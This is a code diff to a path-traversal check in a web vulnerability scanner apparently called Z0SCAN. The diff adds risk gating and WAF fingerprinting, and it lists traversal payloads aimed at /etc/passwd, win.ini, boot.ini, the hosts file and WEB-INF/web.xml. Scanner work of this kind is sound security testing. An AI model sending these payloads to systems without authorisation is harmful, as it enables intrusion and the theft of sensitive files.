@@ -15,13 +15,15 @@ from lib.core.settings import DEFAULT_GET_POST_DELIMITER, DEFAULT_COOKIE_DELIMIT
 class Z0SCAN(PluginBase):
     name = "trave-path"
     desc = 'Path Traversal'
+    version = "2025.5.8"
+    risk = 2
 
     def condition(self, iterdatas):
-        if conf.level == 0:
+        if conf.level == 0 or not 2 in conf.risk or self.fingerprints.waf:
             return False
         for _ in iterdatas:
             key, value, position = _
-            if ("." in value or "/" in value) or (key.lower() in ['filename', 'file', 'path', 'filepath']) and not self.response.waf:
+            if ("." in value or "/" in value) or (key.lower() in ['filename', 'file', 'path', 'filepath']):
                 return True
         return False
     
@@ -30,16 +32,16 @@ class Z0SCAN(PluginBase):
         default_extension = ".jpg"
         payloads.append("../../../../../../../../../../../etc/passwd%00")
         payloads.append("/etc/passwd")
-        if "LINUX" in self.response.os or"DARWIN" in self.response.os:
+        if "LINUX" in self.fingerprints.os or"DARWIN" in self.fingerprints.os:
             payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")))
             payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")) + default_extension)
-        if "WINDOWS" in self.response.os:
+        if "WINDOWS" in self.fingerprints.os:
             payloads.append("../../../../../../../../../../windows/win.ini")
             payloads.append("C:\\boot.ini")
             # if origin:
             #     payloads.append(dirname + "/../../../../../../../../../../windows/win.ini")
             payloads.append("C:\\WINDOWS\\system32\\drivers\\etc\\hosts")
-        if "JAVA" in self.response.programing:
+        if "JAVA" in self.fingerprints.programing:
             payloads.append("/WEB-INF/web.xml")
             payloads.append("../../WEB-INF/web.xml")
         return payloads
@@ -108,7 +110,7 @@ class Z0SCAN(PluginBase):
                         "vultype": VulType.PATH_TRAVERSAL, 
                         "show": {
                             "Position": r"{position} > {k}", 
-                            "payload": payload
+                            "Payload": payload
                             }
                         })
                     result.step("Request1", {
@@ -127,7 +129,7 @@ class Z0SCAN(PluginBase):
                         "vultype": VulType.PATH_TRAVERSAL, 
                         "show": {
                             "Position": r"{position} > {k}", 
-                            "payload": payload
+                            "Payload": payload
                             }
                         })
                     result.step("Request1", {
